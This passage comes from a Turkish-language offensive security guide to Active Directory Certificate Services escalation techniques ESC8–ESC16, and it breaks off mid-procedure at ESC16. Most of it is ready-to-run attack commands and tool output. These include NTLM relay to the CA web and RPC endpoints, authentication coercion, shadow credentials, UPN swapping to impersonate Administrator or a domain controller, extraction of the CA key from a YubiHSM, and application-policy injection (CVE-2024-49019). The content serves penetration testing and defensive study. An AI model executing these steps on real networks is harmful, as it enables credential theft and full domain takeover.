- **Web enrollment interface** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP application'ı), varsayılan olarak yalnızca HTTP kullanır ve bu da NTLM relay attack'lerine karşı koruma sağlamaz. Ayrıca Authorization HTTP header üzerinden yalnızca NTLM authentication'a açıkça izin verir; bu nedenle Kerberos gibi daha güvenli authentication yöntemleri kullanılamaz.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES), varsayılan olarak Authorization HTTP header üzerinden negotiate authentication'ı destekler. Negotiate authentication hem **Kerberos** hem de **NTLM** desteği sunduğundan, attacker'ların relay attack'leri sırasında authentication'ı **NTLM'e downgrade etmesine** olanak tanır. Bu web service'leri varsayılan olarak HTTPS'yi etkinleştirse de yalnızca HTTPS kullanılması **NTLM relay attack'lerine karşı koruma sağlamaz**. HTTPS service'lerinin NTLM relay attack'lerine karşı korunması yalnızca HTTPS'nin channel binding ile birlikte kullanılmasıyla mümkündür. Ne yazık ki AD CS, channel binding için gereken IIS üzerindeki Extended Protection for Authentication'ı etkinleştirmez.<sup>[[6]](#references)</sup>

NTLM relay attack'lerinde sık karşılaşılan bir **sorun**, NTLM session'larının **kısa süreli olması** ve attacker'ın **NTLM signing gerektiren** service'lerle etkileşim kuramamasıdır.

Buna rağmen bu kısıtlama, bir user için certificate elde etmek amacıyla NTLM relay attack'i abuse edilerek aşılabilir; çünkü session'ın süresini certificate'ın geçerlilik süresi belirler ve certificate, **NTLM signing zorunluluğu olan** service'lerle kullanılabilir. Stolen certificate kullanımıyla ilgili talimatlar için bkz.:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack'lerinin bir diğer kısıtlaması, **victim account tarafından attacker-controlled bir machine'e authentication yapılması gerekmesidir**. Attacker ya bekleyebilir ya da bu authentication'ı **force** etmeye çalışabilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)'nin `cas` command'i **enabled HTTP AD CS endpoint'lerini** enumerate eder:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Certificate Authority'ler (CA'ler) tarafından Certificate Enrollment Service (CES) endpoint'lerini depolamak için kullanılır. Bu endpoint'ler **Certutil.exe** aracı kullanılarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile Abuse

Certificate request, varsayılan olarak Certipy tarafından, relay edilen account adının `$` ile bitip bitmediğine göre `Machine` veya `User` template'i temel alınarak yapılır. Alternatif bir template belirtmek için `-template` parametresi kullanılabilir.

Ardından authentication'ı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Domain controller'larla çalışırken `-template DomainController` belirtilmesi gerekir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

**`msPKI-Enrollment-Flag`** için **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) adlı ve ESC9 olarak anılan yeni değer, bir sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` security extension** eklenmesini engeller. Bu flag, `StrongCertificateBindingEnforcement` değeri `1` olarak ayarlandığında (varsayılan ayar) önem kazanır; bu durum `2` ayarının aksinedir. ESC9'un önemi, Kerberos veya Schannel için daha zayıf bir certificate mapping yönteminin istismar edilebileceği senaryolarda (ESC10'da olduğu gibi) artar; çünkü ESC9'un bulunmaması gereksinimleri değiştirmez.<sup>[[7]](#references)</sup>

Bu flag'in ayarının önemli hâle geldiği koşullar şunlardır:

- `StrongCertificateBindingEnforcement` değeri `2` olarak ayarlanmamıştır (varsayılan değer `1`'dir) veya `CertificateMappingMethods`, `UPN` flag'ini içerir.
- Certificate, `msPKI-Enrollment-Flag` ayarı içinde `CT_FLAG_NO_SECURITY_EXTENSION` flag'iyle işaretlenmiştir.
- Certificate tarafından herhangi bir client authentication EKU belirtilmiştir.
- Başka bir hesabı ele geçirmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Abuse Scenario

`John@corp.local` hesabının `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olduğunu ve amacın `Administrator@corp.local` hesabını ele geçirmek olduğunu varsayalım. `Jane@corp.local` hesabının enroll olmasına izin verilen `ESC9` certificate template'i, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` flag'iyle yapılandırılmıştır.

İlk olarak `John`'un `GenericWrite` izni sayesinde `Shadow Credentials` kullanılarak `Jane`'in hash'i elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri, `@corp.local` domain kısmı kasıtlı olarak çıkarılarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local` ifadesi `Administrator` kullanıcısının `userPrincipalName` değeri olarak ayrı kaldığından kısıtları ihlal etmez.

Bunun ardından, güvenlik açığı olduğu belirtilen `ESC9` certificate template'i `Jane` olarak talep edilir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikanın `userPrincipalName` değerinin herhangi bir “object SID” içermeden `Administrator` değerini yansıttığı belirtilmiştir.

Ardından `Jane`'in `userPrincipalName` değeri orijinal hâli olan `Jane@corp.local` değerine geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen certificate ile authentication denenmesi artık `Administrator@corp.local` kullanıcısının NT hash değerini döndürür. Certificate üzerinde domain specification bulunmadığı için komut `-domain <domain>` parametresini içermelidir:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

Domain controller üzerindeki iki registry key değeri ESC10 ile ilişkilendirilir:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`) olup daha önce `0x1F` olarak ayarlanmıştı.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki `StrongCertificateBindingEnforcement` için varsayılan ayar `1` olup daha önce `0` olarak ayarlanmıştı.<sup>[[7]](#references)</sup>

**Durum 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods`, `UPN` bitini (`0x4`) içeriyorsa.

### Abuse Case 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir A hesabı, herhangi bir B hesabını compromise etmek için istismar edilebilir.

Örneğin `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir attacker, `Administrator@corp.local` hesabını compromise etmeyi hedefler. Prosedür ESC9 ile aynıdır ve herhangi bir certificate template'in kullanılmasına olanak tanır.

İlk olarak, `GenericWrite` istismar edilerek Shadow Credentials kullanımıyla `Jane` hesabının hash'i alınır.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ardından `Jane`'in `userPrincipalName` değeri, bir kısıtlama ihlalini önlemek için `@corp.local` kısmı kasıtlı olarak çıkarılarak `Administrator` olarak değiştirilir.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` template'i kullanılarak `Jane` adına client authentication sağlayan bir certificate talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri ardından orijinal hali olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifikayla kimlik doğrulaması yapmak, `Administrator@corp.local` hesabının NT hash'ini sağlayacaktır; sertifikada domain bilgileri bulunmadığından komutta domain'in belirtilmesi gerekir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Durumu 2

`CertificateMappingMethods`, `UPN` bit flag'ini (`0x4`) içerdiğinde, `GenericWrite` izinlerine sahip A hesabı, `userPrincipalName` özelliği bulunmayan tüm B hesaplarını; makine hesapları ve yerleşik domain administrator `Administrator` dahil olmak üzere compromise edebilir.

Buradaki amaç, `GenericWrite` yetkisinden yararlanarak önce Shadow Credentials aracılığıyla `Jane` hesabının hash'ini elde edip `DC$@corp.local` hesabını compromise etmektir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için varsayılan `User` şablonu kullanılarak `Jane` adına bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri bu işlemden sonra özgün haline döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için Certipy’nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulamanın `u:CORP\DC$` olarak başarılı olduğu görülür.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden `set_rbcd` gibi komutlar, Resource-Based Constrained Delegation (RBCD) saldırılarını etkinleştirerek domain controller'ın ele geçirilmesine yol açabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu güvenlik açığı, `userPrincipalName` değerine sahip olmayan veya bu değeri `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesapları için de geçerlidir. Varsayılan `Administrator@corp.local` hesabı, yükseltilmiş LDAP privileges değerleri ve varsayılan olarak `userPrincipalName` değerine sahip olmaması nedeniyle başlıca hedeftir.

## Relaying NTLM to ICPR - ESC11

### Açıklama

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa, RPC service üzerinden signing olmadan NTLM relay attacks gerçekleştirilebilir. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy` kullanarak `Enforce Encryption for Requests` özelliğinin Disabled olup olmadığını enumerate edebilirsiniz; certipy `ESC11` Vulnerabilities bulunduğunu gösterir.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Kötüye Kullanım Senaryosu

Bir relay server kurulması gerekir:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain controller'lar için DomainController içinde `-template` belirtmeliyiz.

Veya [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM ile ADCS CA'ye Shell access - ESC12

### Açıklama

Administrators, Certificate Authority'yi "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde yapılandırabilir.

USB cihazı CA server'a bir USB portu üzerinden bağlanırsa veya CA server bir virtual machine olduğunda bir USB device server kullanılırsa, Key Storage Provider'ın YubiHSM'de key'ler oluşturması ve kullanması için bir authentication key (bazen "password" olarak adlandırılır) gerekir.

Bu key/password, registry'de `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında cleartext olarak depolanır.

[Buradaki](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm) referans.<sup>[[11]](#references)</sup>

### Abuse Scenario

Shell access elde ettiğinizde CA'nın private key'i fiziksel bir USB cihazında depolanıyorsa key'i kurtarmak mümkündür.

İlk olarak CA certificate'ı (bu public'tir) edinmeniz ve ardından:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikasını ve özel anahtarını kullanarak yeni bir rastgele sertifika oluşturmak için `certutil -sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, issuance policy'nin certificate template'e eklenmesine olanak tanır. Issuance policy'leri oluşturmaktan sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID container'ın Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) keşfedilebilir. Bir policy, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir. Bu sayede sistem, sertifikayı sunan kullanıcıyı sanki grubun bir üyesiymiş gibi authorize edebilir. [Buradaki referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Başka bir deyişle, bir kullanıcı certificate enroll etme iznine sahip olduğunda ve sertifika bir OID grubuna bağlı olduğunda, kullanıcı bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Senaryosu

`certipy find` veya `Certify.exe find /showAllPermissions` ile kullanabileceği bir kullanıcı izni bulun.

`John`, `VulnerableTemplate` üzerinde enroll iznine sahipse kullanıcı, `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey template'i belirtmektir; OIDToGroupLink haklarına sahip bir sertifika alacaktır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Güvenlik Açığı Bulunan Certificate Renewal Configuration- ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[14]](#references)</sup>

ESC14, öncelikle Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` attribute'unun kötüye kullanılması ya da güvenli olmayan şekilde yapılandırılması yoluyla ortaya çıkan "weak explicit certificate mapping" güvenlik açıklarını ele alır. Multi-valued olan bu attribute, yöneticilerin kimlik doğrulama amacıyla X.509 certificate'larını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık mapping'ler kullanıldığında, normalde certificate'ın SAN alanındaki UPN veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` security extension içinde yer alan SID'e dayanan varsayılan certificate mapping mantığını geçersiz kılabilir.

"weak" bir mapping, `altSecurityIdentities` attribute'u içinde bir certificate'ı tanımlamak için kullanılan string değerinin fazla geniş, kolayca tahmin edilebilir olması, benzersiz olmayan certificate alanlarına dayanması veya kolayca spoof edilebilen certificate bileşenlerini kullanması durumunda ortaya çıkar. Bir attacker, privileged bir account için weak şekilde tanımlanmış explicit mapping ile eşleşen bir certificate elde edebilir veya oluşturabilirse, bu certificate'ı ilgili account olarak authenticate olmak ve o account'u impersonate etmek için kullanabilir.

Potansiyel olarak weak `altSecurityIdentities` mapping string örnekleri şunlardır:

- Yalnızca yaygın bir Subject Common Name (CN) ile mapping yapılması: ör. `X509:<S>CN=SomeUser`. Bir attacker, daha az güvenli bir kaynaktan bu CN'e sahip bir certificate elde edebilir.
- Specific bir serial number veya subject key identifier gibi ek nitelikler olmadan, aşırı genel Issuer Distinguished Name'ler (DN'ler) veya Subject DN'ler kullanılması: ör. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir attacker'ın meşru şekilde elde edebileceği veya forge edebileceği bir certificate'ta karşılayabileceği diğer tahmin edilebilir pattern'lerin ya da cryptographic olmayan identifier'ların kullanılması (bir CA compromise edilmişse veya ESC1'de olduğu gibi vulnerable bir template bulunmuşsa).

`altSecurityIdentities` attribute'u mapping için çeşitli formatları destekler:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN ile mapping yapar)
- `X509:<SKI>SubjectKeyIdentifier` (certificate'ın Subject Key Identifier extension değerini kullanarak mapping yapar)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number ile mapping yapar; Issuer DN tarafından implicit olarak nitelendirilir) - bu standard bir format değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN içindeki RFC822 adıyla, genellikle bir email address ile mapping yapar)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate'ın raw public key'inin SHA1 hash'i ile mapping yapar - genellikle güçlüdür)

Bu mapping'lerin güvenliği, mapping string içinde kullanılan certificate identifier'larının specificity, uniqueness ve cryptographic strength özelliklerine büyük ölçüde bağlıdır. Domain Controller'larda güçlü certificate binding mode'ları etkin olsa bile (bunlar öncelikle SAN UPN/DNS ve SID extension tabanlı implicit mapping'leri etkiler), kötü yapılandırılmış bir `altSecurityIdentities` entry'si, mapping mantığının kendisi hatalı veya fazla izin verici ise impersonation için doğrudan bir yol oluşturabilir.
### Kötüye Kullanım Senaryosu

ESC14, Active Directory'deki (AD) **explicit certificate mapping** yapılarını, özellikle de `altSecurityIdentities` attribute'unu hedef alır. Bu attribute ayarlanmışsa (tasarım gereği veya yanlış yapılandırma nedeniyle), attacker'lar mapping ile eşleşen certificate'ları sunarak hesapları impersonate edebilir.

#### Senaryo A: Attacker `altSecurityIdentities`'a Yazabilir

**Ön koşul**: Attacker'ın hedef account'un `altSecurityIdentities` attribute'u üzerinde write permission'ı veya hedef AD object'i üzerinde aşağıdaki permission'lardan biri aracılığıyla bu izni verme yetkisi vardır:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Senaryo B: Hedefte Weak Mapping via X509RFC822 (Email) Vardır

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509RFC822 mapping vardır. Bir attacker, victim'ın mail attribute'unu hedefin X509RFC822 adıyla eşleşecek şekilde ayarlayabilir, victim olarak bir certificate enroll edebilir ve bu certificate'ı hedef olarak authenticate olmak için kullanabilir.
#### Senaryo C: Hedefte X509IssuerSubject Mapping Vardır

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509IssuerSubject explicit mapping vardır. Attacker, bir victim principal üzerindeki `cn` veya `dNSHostName` attribute'unu hedefin X509IssuerSubject mapping'inin subject'iyle eşleşecek şekilde ayarlayabilir. Ardından attacker, victim olarak bir certificate enroll edebilir ve bu certificate'ı hedef olarak authenticate olmak için kullanabilir.
#### Senaryo D: Hedefte X509SubjectOnly Mapping Vardır

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509SubjectOnly explicit mapping vardır. Attacker, bir victim principal üzerindeki `cn` veya `dNSHostName` attribute'unu hedefin X509SubjectOnly mapping'inin subject'iyle eşleşecek şekilde ayarlayabilir. Ardından attacker, victim olarak bir certificate enroll edebilir ve bu certificate'ı hedef olarak authenticate olmak için kullanabilir.
### Somut işlemler
#### Senaryo A

`Machine` certificate template'inden bir certificate talep edin
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydedin ve dönüştürün
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifikayı kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizleme (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Daha çeşitli attack senaryolarına yönelik daha spesifik attack yöntemleri için lütfen şuraya bakın: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.<sup>[[15]](#references)</sup>

Yerleşik varsayılan version 1 certificate templates kullanılarak bir attacker, template içinde belirtilen yapılandırılmış Extended Key Usage attributes değerlerine tercih edilen application policies değerlerini içerecek şekilde bir CSR oluşturabilir. Tek gereksinim enrollment rights değeridir ve **_WebServer_** template kullanılarak client authentication, certificate request agent ve codesigning certificates oluşturmak için kullanılabilir.

### Kötüye Kullanım

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) daha ayrıntılı kullanım örnekleri içerir.<sup>[[14]](#references)</sup>


Certipy'nin `find` komutu, CA patch uygulanmamışsa ESC15'e karşı potansiyel olarak savunmasız V1 templates değerlerini belirlemeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senaryo A: Schannel Üzerinden Doğrudan Impersonation

**1. Adım: "Client Authentication" Application Policy ve hedef UPN'yi enjekte ederek bir sertifika talep edin.** Saldırgan `attacker@corp.local`, enrollee-supplied subject özelliğine izin veren "WebServer" V1 template'ini kullanarak `administrator@corp.local` hesabını hedefler.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" içeren güvenlik açığı bulunan V1 template.
- `-application-policies 'Client Authentication'`: `1.3.6.1.5.5.7.3.2` OID'sini CSR'nin Application Policies extension'ına enjekte eder.
- `-upn 'administrator@corp.local'`: Impersonation için SAN'daki UPN'yi ayarlar.

**Adım 2: Elde edilen certificate'ı kullanarak Schannel (LDAPS) üzerinden authenticate olun.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: Enrollment Agent Abuse üzerinden PKINIT/Kerberos Impersonation

**Adım 1: "Enrollee supplies subject" özelliğine sahip bir V1 template'ten, "Certificate Request Agent" Application Policy enjekte ederek bir certificate request edin.** Bu certificate, attacker'ın (`attacker@corp.local`) bir Enrollment Agent olması içindir. Burada attacker'ın kendi identity'si için hiçbir UPN belirtilmez; çünkü amaç agent capability'sini elde etmektir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` değerini enjekte eder.

**Adım 2: Hedef ayrıcalıklı kullanıcı adına certificate istemek için "agent" certificate'ını kullanın.** Bu, 1. Adım'daki certificate'ın agent certificate olarak kullanıldığı ESC3 benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA'de Security Extension Devre Dışı (Global)-ESC16

### Açıklama

**ESC16 (Eksik szOID_NTDS_CA_SECURITY_EXT Extension Üzerinden Privilege Escalation)**, AD CS yapılandırması tüm certificate'lara **szOID_NTDS_CA_SECURITY_EXT** extension'ının eklenmesini zorunlu kılmıyorsa, bir saldırganın şu işlemleri gerçekleştirebilmesi durumunu ifade eder:

1. **SID binding** olmadan bir certificate istemek.

2. Bu certificate'ı **herhangi bir hesap olarak authentication** için kullanmak; örneğin yüksek ayrıcalıklı bir hesabı (örn. Domain Administrator) taklit etmek.

Ayrıntılı prensip hakkında daha fazla bilgi edinmek için şu makaleye de başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Kötüye Kullanım

Aşağıdaki bilgiler [bu bağlantıya](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) referans vermektedir; daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) ortamının **ESC16** için vulnerable olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Mağdur hesabın başlangıç UPN değerini okuyun (İsteğe bağlı - geri yükleme için).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Mağdur hesabının UPN'sini hedef yöneticinin `sAMAccountName` değeriyle güncelleyin.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabı için kimlik bilgilerini elde edin (ör. Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
